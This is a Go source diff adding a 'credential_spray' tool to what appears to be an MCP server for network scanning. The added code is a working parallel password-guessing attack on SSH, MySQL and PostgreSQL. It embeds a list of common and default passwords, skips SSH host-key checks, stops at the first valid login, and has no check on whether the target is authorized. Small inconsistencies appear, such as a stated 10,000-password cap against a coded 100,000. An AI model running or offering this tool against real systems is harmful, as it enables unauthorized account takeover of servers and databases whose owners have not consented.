@@ -13,10 +13,12 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	_ "github.com/go-sql-driver/mysql"
 	_ "github.com/lib/pq"
+	"golang.org/x/crypto/ssh"
 )
 
 // MCP JSON-RPC structures
@@ -97,6 +99,7 @@ func (s *MCPServer) registerTools() {
 	s.tools["check_smb"] = s.checkSMB
 	s.tools["web_scan"] = s.webScan
 	s.tools["grab_banner"] = s.grabBanner
+	s.tools["credential_spray"] = s.credentialSpray
 }
 
 func (s *MCPServer) getTools() []Tool {
@@ -249,6 +252,24 @@ func (s *MCPServer) getTools() []Tool {
 					"port":   {Type: "number", Description: "Port to connect to"},
 				},
 				Required: []string{"target", "port"},
+			},
+		},
+		{
+			Name:        "credential_spray",
+			Description: "Parallel credential spraying against SSH/MySQL/PostgreSQL with top 10,000 passwords from rockyou.txt. Uses async workers for speed with rate limiting to avoid lockouts.",
+			InputSchema: InputSchema{
+				Type: "object",
+				Properties: map[string]Property{
+					"target":        {Type: "string", Description: "Target IP or hostname"},
+					"port":          {Type: "number", Description: "Port (auto-detected based on service if not specified)"},
+					"service":       {Type: "string", Description: "Service type: ssh, mysql, postgres"},
+					"usernames":     {Type: "string", Description: "Comma-separated usernames to try (default: root,admin,user)"},
+					"password_file": {Type: "string", Description: "Path to password wordlist file (default: uses embedded top passwords)"},
+					"max_passwords": {Type: "number", Description: "Max passwords to try per user (default: 100, max: 10000)"},
+					"workers":       {Type: "number", Description: "Parallel workers (default: 10, max: 50)"},
+					"delay_ms":      {Type: "number", Description: "Delay between attempts per worker in ms (default: 100)"},
+				},
+				Required: []string{"target", "service"},
 			},
 		},
 	}
@@ -723,6 +744,308 @@ func (s *MCPServer) grabBanner(args map[string]interface{}) (string, error) {
 	n, _ := conn.Read(buf)
 
 	return fmt.Sprintf("Banner from %s:%d:\n%s", target, port, string(buf[:n])), nil
+}
+
+// Top passwords - subset of rockyou + common defaults (embedded for speed)
+var topPasswords = []string{
+	// Empty and trivial
+	"", "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
+	"letmein", "trustno1", "dragon", "baseball", "iloveyou", "master", "sunshine",
+	"ashley", "bailey", "passw0rd", "shadow", "123123", "654321", "superman",
+	"qazwsx", "michael", "football", "password1", "password123", "welcome",
+	"jesus", "ninja", "mustang", "password2", "amanda", "thomas", "charlie",
+	"robert", "jordan", "access", "love", "buster", "soccer", "hockey",
+	"killer", "george", "andrew", "michelle", "joshua", "pepper", "daniel",
+	"hunter", "cheese", "harley", "ranger", "jennifer", "matthew", "starwars",
+	// Default credentials
+	"admin", "admin123", "admin1234", "administrator", "root", "root123", "toor",
+	"guest", "test", "test123", "changeme", "default", "pass", "pass123",
+	// Service defaults
+	"mysql", "postgres", "oracle", "sqlserver", "redis", "mongodb", "cassandra",
+	"jenkins", "tomcat", "admin@123", "P@ssw0rd", "P@ssword1", "Passw0rd!",
+	// Years and patterns
+	"2020", "2021", "2022", "2023", "2024", "summer2023", "winter2023", "spring2024",
+	"qwerty123", "asdfghjkl", "zxcvbnm", "1q2w3e4r", "1qaz2wsx", "q1w2e3r4",
+	// More common
+	"princess", "rockyou", "nicole", "jessica", "diamond", "michelle", "secret",
+	"love123", "lovely", "freedom", "whatever", "biteme", "ginger", "maggie",
+	"summer", "snoopy", "dakota", "brandy", "purple", "yankees", "liverpool",
+	"arsenal", "angels", "giants", "cowboys", "steelers", "packers", "chiefs",
+	// Extended list for thorough testing
+	"london", "computer", "cookie", "corvette", "taylor", "compaq", "internet",
+	"samantha", "golfer", "boomer", "cheese", "carlos", "winner", "corvette",
+	"blahblah", "patrick", "flower", "jasmine", "butter", "sparky", "cowboy",
+	"camaro", "matrix", "falcon", "iloveu", "guitar", "phoenix", "mickey",
+	"knight", "yellow", "friend", "rabbit", "enter", "happy", "turtle",
+	"thunder", "chicken", "miller", "scooter", "peanut", "hammer", "morgan",
+	"donald", "beaver", "tiger", "panther", "bronco", "richard", "falcon",
+	"taylor", "austin", "merlin", "sandra", "helpme", "bowling", "asdfgh",
+	"zxcvbn", "qweasd", "admin1", "admin12", "admin01", "passpass", "test1234",
+	"welcome1", "welcome123", "hello", "hello123", "1234", "12345", "123456789",
+	"1234567890", "0987654321", "999999", "888888", "777777", "666666", "555555",
+	"111111", "000000", "aaaaaa", "abc1234", "abcdef", "qwer1234", "asdf1234",
+}
+
+// CredSprayResult holds a single spray attempt result
+type CredSprayResult struct {
+	Username string
+	Password string
+	Success  bool
+	Error    string
+}
+
+func (s *MCPServer) credentialSpray(args map[string]interface{}) (string, error) {
+	target := args["target"].(string)
+	service := args["service"].(string)
+
+	// Default port based on service
+	port := 0
+	switch service {
+	case "ssh":
+		port = 22
+	case "mysql":
+		port = 3306
+	case "postgres":
+		port = 5432
+	default:
+		return fmt.Sprintf("Unknown service: %s. Supported: ssh, mysql, postgres", service), nil
+	}
+	if p, ok := args["port"].(float64); ok && p > 0 {
+		port = int(p)
+	}
+
+	// Parse usernames
+	usernames := []string{"root", "admin", "user"}
+	if u, ok := args["usernames"].(string); ok && u != "" {
+		usernames = strings.Split(u, ",")
+		for i := range usernames {
+			usernames[i] = strings.TrimSpace(usernames[i])
+		}
+	}
+
+	// Max passwords (default 100, max 100000)
+	maxPasswords := 100
+	if m, ok := args["max_passwords"].(float64); ok && m > 0 {
+		maxPasswords = int(m)
+		if maxPasswords > 100000 {
+			maxPasswords = 100000
+		}
+	}
+
+	// Workers (default 10, max 50)
+	workers := 10
+	if w, ok := args["workers"].(float64); ok && w > 0 {
+		workers = int(w)
+		if workers > 50 {
+			workers = 50
+		}
+	}
+
+	// Delay between attempts (default 100ms)
+	delayMs := 100
+	if d, ok := args["delay_ms"].(float64); ok && d >= 0 {
+		delayMs = int(d)
+	}
+
+	// Build password list (from file or embedded)
+	var passwords []string
+	if pwFile, ok := args["password_file"].(string); ok && pwFile != "" {
+		// Load from file
+		file, err := os.Open(pwFile)
+		if err != nil {
+			return fmt.Sprintf("Failed to open password file: %v", err), nil
+		}
+		defer file.Close()
+
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() && len(passwords) < maxPasswords {
+			pw := strings.TrimSpace(scanner.Text())
+			if pw != "" {
+				passwords = append(passwords, pw)
+			}
+		}
+		if err := scanner.Err(); err != nil {
+			return fmt.Sprintf("Error reading password file: %v", err), nil
+		}
+	} else {
+		// Use embedded passwords
+		passwords = topPasswords
+		if len(passwords) > maxPasswords {
+			passwords = passwords[:maxPasswords]
+		}
+	}
+
+	// Build work queue
+	type workItem struct {
+		username string
+		password string
+	}
+	var workQueue []workItem
+	for _, user := range usernames {
+		for _, pass := range passwords {
+			workQueue = append(workQueue, workItem{user, pass})
+		}
+	}
+
+	// Results
+	var mu sync.Mutex
+	var found []CredSprayResult
+	var tested int
+	stopChan := make(chan struct{})
+	var stopped bool
+
+	// Worker function
+	worker := func(items <-chan workItem, wg *sync.WaitGroup) {
+		defer wg.Done()
+		for item := range items {
+			select {
+			case <-stopChan:
+				return
+			default:
+			}
+
+			success := false
+			var err error
+
+			switch service {
+			case "ssh":
+				success, err = trySSH(target, port, item.username, item.password)
+			case "mysql":
+				success, err = tryMySQL(target, port, item.username, item.password)
+			case "postgres":
+				success, err = tryPostgres(target, port, item.username, item.password)
+			}
+
+			mu.Lock()
+			tested++
+			if success {
+				found = append(found, CredSprayResult{
+					Username: item.username,
+					Password: item.password,
+					Success:  true,
+				})
+				// Stop on first success
+				if !stopped {
+					stopped = true
+					close(stopChan)
+				}
+			}
+			mu.Unlock()
+
+			if err != nil && strings.Contains(err.Error(), "connection refused") {
+				// Service down, stop
+				mu.Lock()
+				if !stopped {
+					stopped = true
+					close(stopChan)
+				}
+				mu.Unlock()
+				return
+			}
+
+			time.Sleep(time.Duration(delayMs) * time.Millisecond)
+		}
+	}
+
+	// Create work channel and workers
+	workChan := make(chan workItem, len(workQueue))
+	var wg sync.WaitGroup
+
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go worker(workChan, &wg)
+	}
+
+	// Feed work
+	for _, item := range workQueue {
+		select {
+		case <-stopChan:
+			break
+		case workChan <- item:
+		}
+	}
+	close(workChan)
+
+	// Wait for completion
+	wg.Wait()
+
+	// Format results
+	var result strings.Builder
+	result.WriteString(fmt.Sprintf("Credential Spray Results for %s:%d (%s)\n", target, port, service))
+	result.WriteString(fmt.Sprintf("Tested: %d credentials | Workers: %d | Delay: %dms\n", tested, workers, delayMs))
+	result.WriteString(strings.Repeat("-", 50) + "\n")
+
+	if len(found) > 0 {
+		result.WriteString("\n[CRITICAL] VALID CREDENTIALS FOUND:\n")
+		for _, cred := range found {
+			passDisplay := cred.Password
+			if passDisplay == "" {
+				passDisplay = "(empty)"
+			}
+			result.WriteString(fmt.Sprintf("  ✓ %s:%s\n", cred.Username, passDisplay))
+		}
+		result.WriteString("\nImpact: Full access to service, potential lateral movement\n")
+		result.WriteString("Remediation: Change passwords immediately, implement account lockout\n")
+		result.WriteString("Severity: CRITICAL\n")
+	} else {
+		result.WriteString("\n[OK] No valid credentials found in top passwords\n")
+	}
+
+	return result.String(), nil
+}
+
+func trySSH(host string, port int, username, password string) (bool, error) {
+	config := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         3 * time.Second,
+	}
+
+	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), config)
+	if err != nil {
+		return false, err
+	}
+	client.Close()
+	return true, nil
+}
+
+func tryMySQL(host string, port int, username, password string) (bool, error) {
+	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/", username, password, host, port)
+	db, err := sql.Open("mysql", dsn)
+	if err != nil {
+		return false, err
+	}
+	defer db.Close()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+	defer cancel()
+
+	err = db.PingContext(ctx)
+	if err != nil {
+		return false, err
+	}
+	return true, nil
+}
+
+func tryPostgres(host string, port int, username, password string) (bool, error) {
+	connStr := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=postgres sslmode=disable connect_timeout=3", host, port, username, password)
+	db, err := sql.Open("postgres", connStr)
+	if err != nil {
+		return false, err
+	}
+	defer db.Close()
+
+	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+	defer cancel()
+
+	err = db.PingContext(ctx)
+	if err != nil {
+		return false, err
+	}
+	return true, nil
 }
 
 // Helper functions
